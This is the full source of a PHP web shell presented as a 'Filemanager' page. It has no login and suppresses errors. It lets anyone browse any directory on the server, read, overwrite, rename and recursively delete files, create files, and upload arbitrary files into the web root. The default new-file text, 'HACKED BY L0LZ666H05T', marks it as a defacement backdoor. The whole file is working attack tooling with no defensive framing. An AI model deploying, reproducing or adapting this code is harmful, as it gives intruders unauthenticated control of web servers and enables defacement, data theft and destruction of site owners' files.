<!DOCTYPE html>
<html>
<head>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
	<title>Filemanager</title>
</head>
<style type="text/css">
	div.manager {
		width:70%;
	} td.edit {
		border:none;
		background:none;
	} textarea.edit {
		height:400px;
		resize:none;
	} th {
		text-align:center;
	} .icon {
		width:25px;
		height:25px;
	}
</style>
<body>
<br>
<?php
error_reporting(0);
define('SEP', '/');
if (isset($_GET['dir'])) {
	@chdir($_GET['dir']);
}
function cwd() {
	$cwd = @str_replace('\\', '/', @getcwd());
	return $cwd;
}
function pwd() {
	$dir = @explode('/', @cwd());
	foreach ($dir as $key => $pwd) {
		print("<a href='?dir=");
		for ($i=0; $i <= $key ; $i++) { 
			print($dir[$i]);
			if ($i != $key) {
				print("/");
			}
		} print("'>".$pwd."</a>/");
	}
}
function perms($filename) {
	$perms = fileperms($filename);

switch ($perms & 0xF000) {
    case 0xC000: // socket
        $info = 's';
        break;
    case 0xA000: // symbolic link
        $info = 'l';
        break;
    case 0x8000: // regular
        $info = 'r';
        break;
    case 0x6000: // block special
        $info = 'b';
        break;
    case 0x4000: // directory
        $info = 'd';
        break;
    case 0x2000: // character special
        $info = 'c';
        break;
    case 0x1000: // FIFO pipe
        $info = 'p';
        break;
    default: // unknown
        $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

return $info;
}
function permission($filename, $perms) {
	if (@is_writable($filename)) {
		?> <font color="green"><?php print $perms ?></font> <?php
	} else {
		?> <font color="red"><?php print $perms ?></font> <?php
	}
}
function size($filename) {
	$size = @filesize($filename)/1024;
	$size = @round($size, 3);
	if ($size > 1024) {
		$size = @round($size/1024,2). 'MB';
	} else {
		$size = $size. 'KB';
	} return $size;
}
function edit($filename, $text) {
	$fp = @fopen($filename, 'w');
	if (@fwrite($fp, $text)) {
		?>
		<div class="alert alert-success" role="alert">
        This File <b><u><?php print $filename ?></u></b> Has Been Edited
        </div>
		<?php
	} else {
		?>
		<div class="alert alert-danger" role="alert">
         This File <b><u><?php print $filename ?></u></b> Failed To Edited
        </div>
		<?php
	}
}
function renames($filename, $newname) {
	if (@rename($filename, $newname)) {
		?>
		<div class="alert alert-success" role="alert">
			This File <b><u><?php print $filename ?></u></b> Has Been Rename to 
			<b><u><?php print $newname ?></u></b>
		</div>
		<?php
	} else {
		?>
		<div class="alert alert-danger" role="alert">
			This File <b><u><?php print $filename ?></u></b> Failed to Rename
		</div>
		<?php
	}
}
function makedir($filename) {
	if (@mkdir(@htmlspecialchars($filename))) {
		?>
		<div class="alert alert-success" role="alert">
			This Dir <b><u><?php print $filename ?></u></b> Has Been Created !
		</div>
		<?php
	} else {
		?>
		<div class="alert alert-danger" role="alert">
			This Dir <b><u><?php print $filename ?></u></b> Failed to Create
		</div>
		<?php
	}
}
function makefile($filename, $text) {
	$fp = @fopen($filename, "w");
	if (@fwrite($fp, $text)) {
		?>
		<div class="alert alert-success" role="alert">
			This File <b><u><?php print $filename ?></u></b> Has Been Created !
		</div>
		<?php
	} else {
		?>
		<div class="alert alert-danger" role="alert">
			This File <b><u><?php print $filename ?></u></b> Failed to Create
		</div>
		<?php
	}
	@flush();
}
?>
<center>
	<div class="form-control manager" disable>
		<center><h4>FILEMANAGER</h4></center>
		<table width="100%" align="center" class="table-striped">
			<tr>
    		<th colspan="4">
    			<center>
    				Cwd : <?php print @pwd() ?> ( <?php print @permission(@cwd(), @perms(@cwd())) ?> )
    			</center>
    		</th>
    		<th>
    			<div class="btn-group">
                  <a href="http://<?php print $_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'] ?>" style="font-weight:bold;color:#fff;" class="btn btn-success btn-sm" style="width:100%;">
                    HOME
                  </a>
                  <button type="button" class="btn btn-sm btn-success dropdown-toggle dropdown-toggle-split" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                   <span class="sr-only">Toggle Dropdown</span>
                  </button>
                  <div class="dropdown-menu">
                   <a class="dropdown-item" href="?dir=<?php print @cwd() ?>&do=upload">
                   	<img src="https://www.pngarts.com/files/2/Upload-PNG-Image-Background.png" class="icon"> 
                    UPLOAD FILE</a>
                    <a class="dropdown-item" href="?dir=<?php print @cwd() ?>&do=makefile">
                    <img src="http://www.sclance.com/pngs/add-png/add_png_16398.jpg" class="icon">
                    MAKEFILE</a> 
                  </div>
                </div>
    		</th>
    	    </tr>
    	    <tr><th></th></tr>
		<tr>
		<?php
			function delete($dir) {
	if (@is_dir($dir)) {
		$scandir = @scandir($dir);
		foreach ($scandir as $object) {
			if ($object != '.' && $object != '..') {
				if (@is_dir($dir.DIRECTORY_SEPARATOR.$object)) {
					@delete($dir.DIRECTORY_SEPARATOR.$object);
				} else {
					@unlink($dir.DIRECTORY_SEPARATOR.$object);
				}
			}
		} if (@rmdir($dir)) {
			?>
			<center>
		    <div class="alert alert-success" role="alert">
            This Dir <b><u><?php print $dir ?></u></b> Has Been Deleted
            </div>
            </center>
		    <?php
		} else {
			?>
			<center>
		    <div class="alert alert-danger" role="alert">
            This Dir <b><u><?php print $dir ?></u></b> Failed to Delete
            </div>
            </center>
		    <?php
		}
	} else {
		if (@unlink($dir)) {
			?>
			<center>
		    <div class="alert alert-success" role="alert">
            This File <b><u><?php print $dir ?></u></b> Has Been Deleted
            </div>
            </center>
		    <?php
		} else {
			?>
			<center>
		    <div class="alert alert-danger" role="alert">
            This File <b><u><?php print $dir ?></u></b> Failed to Delete
            </div>
            </center>
		    <?php
		}
	}
}
if ($_POST['do'] == 'delete') {
	@delete($_POST['file']);
}

			if ($_POST['do'] == 'edit') {
	          if (isset($_POST['submit'])) {
		        @edit($_POST['file'], $_POST['text']);
	        } $text = @htmlspecialchars(@file_get_contents($_POST['file']));
	        ?>
	        <form method="post">
	        	<td colspan="5" class="edit">
	        	<textarea class="form-control edit" name="text"><?php print $text ?></textarea></td>
	        	<input type="hidden" name="do" value="edit">
	        	<input type="hidden" name="file" value="<?php print $_POST['file'] ?>">
		        <tr><td colspan="5" class="edit">
		        <center>
		        	<input style="width:100%;" type="submit" name="submit" class="btn btn-success">
		        </center></td>
	        </form>
	        <?php
            }
            if ($_POST['do'] == 'renames') {
            	if (isset($_POST['submit'])) {
            		@renames($_POST['file'], $_POST['newname']);
            	}
            	?>
            	<form method="post">
            		<td colspan="4">
            			<input class="form-control" style="width:100%;" type="text" name="newname" value="<?php print $_POST['file'] ?>">
            		</td>
            		<input type="hidden" name="do" value="renames">
	        	    <input type="hidden" name="file" value="<?php print $_POST['file'] ?>">
            		<td>
            			<input style="width:100%;" type="submit" name="submit" class="btn btn-success"> 
            		</td>
            	</form>
            	<?php
            }
            if ($_GET['do'] == 'makefile') {
            	if (isset($_POST['submit'])) {
            		if ($_POST['type'] == 'file') {
            			@makefile($_POST['filename'], $_POST['text']);
            		}
            		if ($_POST['type'] == 'dir') {
            			@makedir($_POST['filename']);
            		}
            	}
            	?>
            	<form method="post">
            		<tr>
            			<td colspan="5">
            				<center>
            				<input type="radio" name="type" value="file" checked> file
            				<input type="radio" name="type" value="dir"> dir
            			    </center>  
            			</td>
            		</tr>
            		<tr>
            			<td colspan="5">
            				<center>If you want create <b><u>dir</u></b> please empty the text</center>
            			</td>
            		</tr>
            		<tr>
            			<td colspan="5">
            				<input class="form-control" type="text" name="filename" placeholder="filename/dir">
            			</td>
            		</tr>
            		<tr>
            			<td colspan="5">
            				<textarea class="form-control edit" name="text">HACKED BY L0LZ666H05T</textarea>
            			</td>
            		</tr>
            		<tr>
            			<td colspan="5">
            				<input class="btn btn-success" style="width:100%;" type="submit" name="submit">
            			</td>
            		</tr>
            	</form>
            	<?php
            }
            if ($_GET['do'] == 'upload') {
            	if (isset($_POST['submit'])) {
            		if ($_POST['type'] == 'biasa') {
            			if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
            				?>
		                    <div class="alert alert-success" role="alert">
		                    	This File <b><u><?php print $_FILES['file']['name'] ?></u></b> Has Been Uploaded !
		                    </div>
		                    <?php
            			} else {
            				?>
		                    <div class="alert alert-danger" role="alert">
		                    	This File <b><u><?php print $_FILES['file']['name'] ?></u></b> Cannot Uploaded !
		                    </div>
		                    <?php
            			}
            		}
            		if ($_POST['type'] == 'home') {
            			$home = $_SERVER['DOCUMENT_ROOT'];
            			if (@copy($_FILES['file']['tmp_name'], $home.SEP.$_FILES['file']['name'])) {
            				?>
		                    <div class="alert alert-success" role="alert">
		                    	This File <b><u><a href="http://<?php print $_SERVER['SERVER_NAME'].SEP.$_FILES['file']['name'] ?>">
		                    		http://<?php print $_SERVER['SERVER_NAME'].SEP.$_FILES['file']['name'] ?>
		                    	</a></u></b> Has Been Uploaded !
		                    </div>
		                    <?php
            			} else {
            				print("Failed");
            			}
            		}
            	}
            	?>
            	<form method="post" enctype="multipart/form-data">
            		<tr>
            			<td colspan="5">
            				<center>
            				<input type="radio" name="type" value="biasa" checked> biasa
            				( <?php print @permission(@cwd(), @perms(@cwd())) ?> )
            				<input type="radio" name="type" value="home"> home_root
            				( <?php print @permission($_SERVER['DOCUMENT_ROOT'], @perms($_SERVER['DOCUMENT_ROOT'])) ?> )
            			    </center>
            			</td>
            		</tr>
            		<tr>
            			<td colspan="5">
            				<center>
            				<input type="file" name="file">
            				<input type="submit" name="submit">
            			</center>
            			</td>
            		</tr>
            	</form>
            	<?php
            }
			?>
		</tr>
    	<tr>
    		<th>Filename</th>
    		<th>Size</th>
    		<th>Permission</th>
    		<th colspan="2">Action</th>
    	</tr>
    	<?php
    	$scandir = @scandir(@cwd());
    	foreach ($scandir as $dir) {
    		if (!is_dir($dir)) continue;
    		if ($dir === '.' || $dir === '..') continue;
    		?><tr>
    			<td>
    				<img src="http://icons.iconarchive.com/icons/custom-icon-design/flatastic-1/256/folder-icon.png" class="icon"> 
    				 <a href="?dir=<?php print @cwd().SEP.$dir ?>"><?php print $dir ?></a>
    			</td>
    			<td><center>--</center></td>
    			<td>
    				<?php print @permission($dir, @perms($dir)) ?>
    			</td>
    			<td>
    				<center>
    				<form method="post" action="?dir=<?php print @cwd() ?>">
    					<select class="btn btn btn-outline-success btn-sm" name="do" style="width:100%;">
    						<option value="renames">Rename</option>
    						<option value="delete">Delete</option>
    					</select>
    				</td>
    					<input type="hidden" name="file" value="<?php print $dir ?>">
    					<td><input type="submit" name="" class="btn btn-success btn-sm" style="width:100%;">
    				</form>
    			</center>
    			</td>
    		</tr> 
    		<?php
    	}
    	foreach ($scandir as $file) {
    		if (!is_file($file)) continue;
    		?>
    		<tr>
    			<td>
    				<img class="icon" src="https://pngimage.net/wp-content/uploads/2018/06/file-png-12.png">
    				 <?php print $file ?>
    			</td>
    			<td>
    				<center><?php print @size($file) ?></center>
    			</td>
    			<td><?php print @permission($file, @perms($file)) ?></td>
    			<td><center>
    				<form method="post" action="?dir=<?php print @cwd() ?>">
    					<select class="btn btn btn-outline-success btn-sm" name="do" style="width:100%;">
    						<option value="edit">Edit</option>
    						<option value="renames">Rename</option>
    						<option value="delete">Delete</option>
    					</select>
    				</td>
    					<input type="hidden" name="file" value="<?php print $file ?>">
    					<td><input type="submit" name="" class="btn btn-success btn-sm" style="width:100%;">
    				</form>
    			</td>
    		</tr>
    		<?php
    	}
    	?>
    </table>
	</div>
</center>
</body>
</html>
